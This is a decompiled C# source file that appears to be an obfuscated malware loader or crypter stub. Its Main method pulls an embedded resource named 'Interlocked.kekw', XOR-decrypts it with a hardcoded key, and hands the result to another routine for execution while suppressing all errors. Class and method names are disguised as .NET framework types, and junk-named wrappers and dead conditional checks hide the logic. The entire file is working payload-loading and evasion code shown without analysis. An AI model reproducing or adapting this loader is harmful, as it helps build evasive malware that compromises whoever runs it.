using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

internal class Interlocked
{
	private static string pass = "KGYMWtFCjILg";

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public Interlocked()
	{
		dngKmfOJMEsh8ovv8L(this);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static void dngKmfOJMEsh8ovv8L(object object_0)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static byte[] getResource_1(Assembly object_0)
	{
		if (!WZuRWOsp10a1ilOmNM())
		{
			byte[] result = null;
			Stream stream = (Stream)KBJGyOJ6Hxs7daZsNq(object_0, "Interlocked.kekw");
			try
			{
				using BinaryReader object_ = new BinaryReader(stream);
				result = (byte[])teTNJG323FiDpYi6qg(object_, (int)stream.Length);
			}
			finally
			{
				if (stream != null)
				{
					hvhcmkn2fbBoWDTYys(stream);
				}
			}
			return result;
		}
		return null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static byte[] decryptBytes(byte[] object_0)
	{
		byte[] array = (byte[])SZiGJSWX7IMl0Tu7ix(Encoding.Unicode, pass);
		WZuRWOsp10a1ilOmNM();
		if (Kdg8XJuS6keOYyoVWm())
		{
			int num = 0;
		}
		for (int num = 0; num < object_0.Length; num++)
		{
			object_0[num] ^= array[num % 16];
		}
		return object_0;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void AsyncMethodBuilderCore()
	{
		Cursor.BlockingCollection1((byte[])SVV99JbrVUuarZs9wa(getResource_1(Assembly.GetExecutingAssembly())));
	}

	private static void Main()
	{
		try
		{
			AsyncMethodBuilderCore();
		}
		catch
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object KBJGyOJ6Hxs7daZsNq(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetManifestResourceStream((string)object_1);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object teTNJG323FiDpYi6qg(object object_0, int int_0)
	{
		return ((BinaryReader)object_0).ReadBytes(int_0);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static void hvhcmkn2fbBoWDTYys(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool Kdg8XJuS6keOYyoVWm()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool WZuRWOsp10a1ilOmNM()
	{
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object SZiGJSWX7IMl0Tu7ix(object object_0, object object_1)
	{
		return ((Encoding)object_0).GetBytes((string)object_1);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object SVV99JbrVUuarZs9wa(object object_0)
	{
		return decryptBytes((byte[])object_0);
	}
}
